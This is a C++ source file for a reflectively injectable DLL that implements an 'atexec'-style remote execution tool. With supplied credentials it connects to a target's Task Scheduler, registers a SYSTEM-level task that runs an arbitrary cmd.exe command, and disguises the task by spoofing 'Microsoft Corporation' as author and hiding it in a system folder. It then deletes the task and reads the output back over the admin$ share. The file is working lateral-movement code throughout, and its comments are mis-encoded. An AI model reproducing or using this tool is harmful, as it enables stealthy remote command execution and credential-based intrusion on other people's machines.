//===============================================================================================//
// This is a stub for the actuall functionality of the DLL.
//===============================================================================================//
#define _WIN32_DCOM
#define _CRT_SECURE_NO_WARNINGS   // �����ϰ汾��������ʾ�İ�ȫ����
#include "ReflectiveLoader.h"
#include <iostream>
#include <windows.h>
#include <stdio.h>
#include <comdef.h>
#include <string>
#include <time.h>
#include <taskschd.h>
#include <winnetwk.h>
#include <shellapi.h>

#pragma comment(lib,"taskschd.lib")
#pragma comment(lib,"comsupp.lib")
#pragma comment(lib, "ws2_32")   
#pragma comment(lib, "Mpr.lib")
#pragma comment(lib,"Advapi32.lib")
// Note: REFLECTIVEDLLINJECTION_VIA_LOADREMOTELIBRARYR and REFLECTIVEDLLINJECTION_CUSTOM_DLLMAIN are
// defined in the project properties (Properties->C++->Preprocessor) so as we can specify our own 
// DllMain and use the LoadRemoteLibraryR() API to inject this DLL.


ITaskService* pService = NULL;
ITaskFolder* pRootFolder = NULL;
HRESULT hr = NULL;
std::string szargs;
std::wstring wszargs;
std::wstring wsHostFile;
LPCWSTR wsCommand = NULL; // ִ������
LPCWSTR lpwsHost = NULL; // Ŀ�������ַ
LPCWSTR lpwsUserName = NULL; // �˺�
LPCWSTR lpwsPassword = NULL; // ����
WCHAR wsOutPutPath[] = TEXT("C:\\Windows\\RunTime.log");
BOOL bRetVal = FALSE;
WCHAR wsTaskName[] = TEXT("TestBody");
LPCWSTR lpwDomain = NULL;
int argc = 0;
LPWSTR* argv = NULL;

BOOL ConnectTaskServer(LPCWSTR lpwsHost, LPCWSTR lpwDomain, LPCWSTR lpwsUserName, LPCWSTR lpwsPassword) {
	// ��ʼ��COM���
	hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
	// ���������ȫ�ȼ�
	hr = CoInitializeSecurity(NULL, -1, NULL, NULL, RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, 0, NULL);
	// ���������������
	hr = CoCreateInstance(CLSID_TaskScheduler, NULL, CLSCTX_INPROC_SERVER, IID_ITaskService, (void**)&pService);
	// ����Ŀ�������ΪԶ�����ӻ򱾵ط�����
	hr = pService->Connect(_variant_t(lpwsHost), _variant_t(lpwsUserName), _variant_t(lpwDomain), _variant_t(lpwsPassword));	//Ĭ�ϱ���
	if (FAILED(hr))
	{
		printf("ITaskService::Connect failed: %x \n", hr);

		pService->Release();
		CoUninitialize();
		return FALSE;
	}
	return TRUE;
}


DWORD ConnectSMBServer(LPCWSTR lpwsHost, LPCWSTR lpwsUserName, LPCWSTR lpwsPassword)
{
	// ���ڴ��SMB������Դ��ʽ
	PWCHAR lpwsIPC = new WCHAR[MAX_PATH];
	DWORD dwRetVal; // ��������ֵ
	NETRESOURCE nr; // ���ӵ���ϸ��Ϣ
	DWORD dwFlags; // ����ѡ��

	ZeroMemory(&nr, sizeof(NETRESOURCE));
	swprintf(lpwsIPC, TEXT("\\\\%s\\admin$"), lpwsHost);
	nr.dwType = RESOURCETYPE_ANY; // ö��������Դ
	nr.lpLocalName = NULL;
	nr.lpRemoteName = lpwsIPC; // ��Դ��������
	nr.lpProvider = NULL;

	// ��������˴�λ��־�������ϵͳ�����û���¼ʱ�Զ����Իָ����ӡ�
	dwFlags = CONNECT_UPDATE_PROFILE;

	dwRetVal = WNetAddConnection2(&nr, lpwsPassword, lpwsUserName, dwFlags);
	if (dwRetVal == NO_ERROR) {
		// ����NO_ERROR��ɹ�
		// wprintf(L"Connection added to %s\n", nr.lpRemoteName);
		return dwRetVal;
	}

	wprintf(L"WNetAddConnection2 failed with error: %u\n", dwRetVal);
	return -1;
}

BOOL GetSMBServerFileContent(LPCWSTR lpwsDstPath) {
	DWORD dwFileSize = 0;
	PCHAR readBuf = NULL;
	DWORD dwReaded = 0;
	BOOL bRet = TRUE;
	HANDLE hFile = CreateFile(lpwsDstPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE) {
		wprintf(TEXT("Can't Read File : %s \n"), lpwsDstPath);
		return FALSE;
	}
	wprintf(TEXT("Can't Read File : %s \n"), lpwsDstPath);
	// ��ȡ�ļ���С
	dwFileSize = GetFileSize(hFile, NULL);
	readBuf = (PCHAR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwFileSize);
	ReadFile(hFile, readBuf, dwFileSize, &dwReaded, NULL);
	wprintf(TEXT("===========================\n"));
	printf("%s", readBuf);
	CloseHandle(hFile);
	HeapFree(GetProcessHeap(), HEAP_NO_SERIALIZE, readBuf);
	wprintf(TEXT("\n===========================\n"));
	return TRUE;
}

// ��ȡδ��5����ʱ��
std::wstring GetTime() {
	WCHAR CurrentTime[100];
	SYSTEMTIME sys;
	GetLocalTime(&sys);
	sys.wSecond += 5;
	if (sys.wSecond >= 60) {
		sys.wMinute++;
		sys.wSecond -= 60;
	}
	wsprintf(CurrentTime, TEXT("%4d-%02d-%02dT%02d:%02d:%02d"), sys.wYear, sys.wMonth, sys.wDay, sys.wHour, sys.wMinute, sys.wSecond);
	std::wstring returnTime(CurrentTime);
	std::wcout << returnTime << std::endl;
	return returnTime;
}


BOOL CreatTask(LPCWSTR wTaskName, LPCWSTR wCommand, LPCWSTR wOutPutPath) {
	std::wstring CurrentTime;
	std::wstring CommandArgs(TEXT("/c "));
	CommandArgs.append(wCommand);
	CommandArgs.append(TEXT(" >"));
	CommandArgs.append(wOutPutPath);

	std::wstring wstrExePath(TEXT("C:\\Windows\\System32\\cmd.exe"));

	// ��ȡ�����ļ��в������д�������
	pService->GetFolder(_bstr_t(L"\\Microsoft\\Windows\\AppID"), &pRootFolder);
	// �������ͬ������ɾ����
	pRootFolder->DeleteTask(_bstr_t(wTaskName), 0);

	// ʹ��ITaskDefinition���������������Ϣ
	ITaskDefinition* pTask = NULL;
	pService->NewTask(0, &pTask);

	// ʹ��IRegistrationInfo���������Ļ�����Ϣ���
	IRegistrationInfo* pRegInfo = NULL;
	pTask->get_RegistrationInfo(&pRegInfo);
	pRegInfo->put_Author(_bstr_t(L"Microsoft Corporation"));

	// ��������İ�ȫƾ֤
	IPrincipal* pPrincipal = NULL;
	pTask->get_Principal(&pPrincipal);

	// ���ù���Ϊ����ʽ��¼
	pPrincipal->put_LogonType(TASK_LOGON_INTERACTIVE_TOKEN);

	pPrincipal->put_UserId(_bstr_t(L"NT AUTHORITY\\SYSTEM"));

	// ���������������Ϣ
	ITaskSettings* pTaskSettings = NULL;
	pTask->get_Settings(&pTaskSettings);
	// Ϊ������Ϣ��ֵ
	pTaskSettings->put_StartWhenAvailable(VARIANT_TRUE);
	// ���������idle����
	IIdleSettings* pIdleSettings = NULL;
	pTaskSettings->get_IdleSettings(&pIdleSettings);
	pIdleSettings->put_WaitTimeout(_bstr_t(L"PT1M"));

	//����������
	ITriggerCollection* pTriggerCollection = NULL;
	pTask->get_Triggers(&pTriggerCollection);
	ITrigger* pTrigger = NULL;
	printf("[+] Create the trigger\n");
	hr = pTriggerCollection->Create(TASK_TRIGGER_TIME, &pTrigger);
	if (FAILED(hr))
	{
		printf("\nCannot create the trigger: %x", hr);
		pRootFolder->Release();
		pTask->Release();
		CoUninitialize();
		return FALSE;
	}
	// ����ʱ�䴥����
	ITimeTrigger* pTimeTrigger = NULL;
	pTrigger->QueryInterface(IID_ITimeTrigger, (void**)&pTimeTrigger);
	pTimeTrigger->put_Id(_bstr_t(L"Trigger2"));
	CurrentTime = GetTime();
	wprintf(TEXT("[+] +Arguments  : %s \n"), CommandArgs.data());
	// ��5���ִ��
	pTimeTrigger->put_StartBoundary(_bstr_t(CurrentTime.data()));
	pTimeTrigger->put_EndBoundary(_bstr_t(L"2089-03-26T13:00:00"));
	// ����������
	IActionCollection* pActionCollection = NULL;
	pTask->get_Actions(&pActionCollection);
	IAction* pAction = NULL;
	pActionCollection->Create(TASK_ACTION_EXEC, &pAction);
	IExecAction* pExecAction = NULL;
	// ����ִ���������
	pAction->QueryInterface(IID_IExecAction, (void**)&pExecAction);
	pExecAction->put_Path(_bstr_t(wstrExePath.c_str()));
	pExecAction->put_Arguments(_bstr_t(CommandArgs.data()));
	wprintf(TEXT("[+] ++Arguments  : %s \n"),CommandArgs.data());
	IRegisteredTask* pRegistredTask = NULL;
	pRootFolder->RegisterTaskDefinition(_bstr_t(wTaskName), pTask, TASK_CREATE_OR_UPDATE,
		_variant_t(), _variant_t(), TASK_LOGON_INTERACTIVE_TOKEN, _variant_t(), &pRegistredTask);
	Sleep(10000);
	wprintf(TEXT("[+] Sleep  : 10000ms \n"));
	// ����ʱɾ������
	pRootFolder->DeleteTask(_bstr_t(wTaskName), 0);
	wprintf(TEXT("[+] Delete Task : %s \n"), wTaskName);
	pRootFolder->Release();
	pService->Release();
	CoUninitialize();
	return TRUE;
}

std::wstring StringToWString(const std::string& str)
{
	int num = MultiByteToWideChar(CP_UTF8, 0, str.c_str(), -1, NULL, 0);
	wchar_t* wide = new wchar_t[num];
	MultiByteToWideChar(CP_UTF8, 0, str.c_str(), -1, wide, num);
	std::wstring w_str(wide);
	delete[] wide;
	return w_str;
}

std::string WStringToString(const std::wstring& wstr)
{
	std::string str;
	int nLen = (int)wstr.length();
	str.resize(nLen, ' ');
	int nResult = WideCharToMultiByte(CP_ACP, 0, (LPCWSTR)wstr.c_str(), nLen, (LPSTR)str.c_str(), nLen, NULL, NULL);
	if (nResult == 0)
	{
		return "";
	}
	return str;
}

// You can use this value as a pseudo hinstDLL value (defined and set via ReflectiveLoader.c)
extern HINSTANCE hAppInstance;
//===============================================================================================//
BOOL WINAPI DllMain( HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved )
{
    BOOL bReturnValue = TRUE;
	switch( dwReason ) 
    { 
		case DLL_QUERY_HMODULE:
			if( lpReserved != NULL )
				*(HMODULE *)lpReserved = hAppInstance;
			break;
		case DLL_PROCESS_ATTACH:
			hAppInstance = hinstDLL;
			
			szargs = (PCHAR)lpReserved;
			// ת����խ
			wszargs = StringToWString(szargs);
			argv = CommandLineToArgvW(wszargs.data(), &argc);
			if (argv == NULL) {
				printf("[+] Error Arguments ! \n");
				break;
			}
			
			printf("[+] Args Count : %d \n", argc);
			for (size_t i = 0; i < argc; i++)
			{
				wprintf(TEXT("[%d] %s \n"), i, argv[i]);
			}
			
			if (argc < 4) {
				wprintf(TEXT("atexec <Host> <Username> <Password> <Command> [Domain] \n"));
				wprintf(TEXT("Usage: \n"));
				wprintf(TEXT("atexec 192.168.3.130 Administrator 123456 whoami SYS.LOCAL\n"));
				wprintf(TEXT("atexec 192.168.3.130 Administrator 123456 whoami\n"));
				break;
			}
			if (argc == 5) {
				lpwDomain = argv[4]; // ����
			}
			wsCommand = argv[3]; // ִ������
			lpwsHost = argv[0]; // Ŀ�������ַ
			lpwsUserName = argv[1]; // �˺�
			lpwsPassword = argv[2]; // ����
			wprintf(TEXT("[+] Host: %s , UserName: %s , Password: %s , Command: %s \n"), lpwsHost, lpwsUserName,lpwsPassword, wsCommand);
			
			wsHostFile.append(TEXT("\\\\"));
			wsHostFile.append(lpwsHost);
			wsHostFile.append(TEXT("\\admin$\\RunTime.log"));
			// ��������ƻ�
			bRetVal = ConnectTaskServer(lpwsHost, NULL, lpwsUserName, lpwsPassword);
			if (!bRetVal) {
				wprintf(TEXT("[+] ConnectTaskServer [%s] Error : %d \n",lpwsHost,GetLastError()));
				break;
			}

			bRetVal = CreatTask(wsTaskName, wsCommand, wsOutPutPath);
			if (!bRetVal) {
				// MessageBox(NULL, L"[+] CreatTask Error! ", TEXT("INFO"), MB_OK);
				wprintf(TEXT("[+] CreatTask Error! \n"));
				break;
			}
			Sleep(5000);
			// ����Ŀ�������SMB
			if (ConnectSMBServer(lpwsHost, lpwsUserName, lpwsPassword) == 0) {
				// ���ӳɹ�
				GetSMBServerFileContent(wsHostFile.data());
			}
			else {
				// MessageBox(NULL, L"[+] Can't Connect to ! ", TEXT("INFO"), MB_OK);
				std::wcout << TEXT("Can't Connect to ") << lpwsHost << std::endl;
			}
			
			break;
		case DLL_PROCESS_DETACH:
		case DLL_THREAD_ATTACH:
		case DLL_THREAD_DETACH:
            break;
    }
	return bReturnValue;
}